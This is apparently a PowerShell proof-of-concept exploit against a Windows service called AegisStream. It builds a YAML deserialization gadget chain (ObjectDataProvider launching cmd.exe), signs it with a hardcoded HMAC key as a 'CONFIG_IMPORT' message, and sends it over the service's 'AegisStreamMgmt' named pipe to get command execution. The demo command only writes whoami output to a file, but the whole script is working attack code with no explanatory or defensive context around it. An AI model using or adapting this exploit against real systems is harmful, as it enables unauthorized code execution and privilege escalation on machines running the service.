$opKeyHex = "4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c"
$opKey = [byte[]]::new(32)
for ($i = 0; $i -lt 32; $i++) { $opKey[$i] = [Convert]::ToByte($opKeyHex.Substring($i*2, 2), 16) }
$nl = [char]10
$yaml = "--- !System.Windows.Data.ObjectDataProvider%2CPresentationFramework" + $nl +
    "ObjectInstance:" + $nl +
    "  !System.Diagnostics.Process%2CSystem.Diagnostics.Process" + $nl +
    "  StartInfo:" + $nl +
    "    !System.Diagnostics.ProcessStartInfo%2CSystem.Diagnostics.Process" + $nl +
    "    FileName: cmd.exe" + $nl +
    "    Arguments: '/c whoami > C:\ProgramData\AegisStream\logs\rce.txt'" + $nl +
    "MethodName: Start"
$payload = [Text.Encoding]::UTF8.GetBytes($yaml)
$opBytes = [Text.Encoding]::UTF8.GetBytes('CONFIG_IMPORT')
$hmac = New-Object System.Security.Cryptography.HMACSHA256(,$opKey)
$signData = New-Object byte[] ($opBytes.Length + $payload.Length)
[Array]::Copy($opBytes, 0, $signData, 0, $opBytes.Length)
[Array]::Copy($payload, 0, $signData, $opBytes.Length, $payload.Length)
$sig = $hmac.ComputeHash($signData)
$ms = New-Object IO.MemoryStream
$bw = New-Object IO.BinaryWriter($ms)
$bw.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$bw.Write([int32]1)
$bw.Write([int16]$opBytes.Length); $bw.Write($opBytes)
$bw.Write([int32]$payload.Length); $bw.Write($payload)
$bw.Write($sig); $bw.Flush()
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Identification)
$pipe.Connect(5000)
$pipe.Write($ms.ToArray(), 0, $ms.Length); $pipe.Flush()
$buf = New-Object byte[] 131072
$n = $pipe.Read($buf, 0, 131072); $pipe.Dispose()
$rOpLen = [BitConverter]::ToUInt16($buf, 8)
$rOpCode = [Text.Encoding]::UTF8.GetString($buf, 10, $rOpLen)
$rPlLen = [BitConverter]::ToInt32($buf, 10 + $rOpLen)
Write-Output "Status: $rOpCode | PayloadLen: $rPlLen"
if ($rPlLen -gt 0) {
    $rPayload = New-Object byte[] $rPlLen
    [Array]::Copy($buf, 14 + $rOpLen, $rPayload, 0, $rPlLen)
    Write-Output ([Text.Encoding]::UTF8.GetString($rPayload))
}
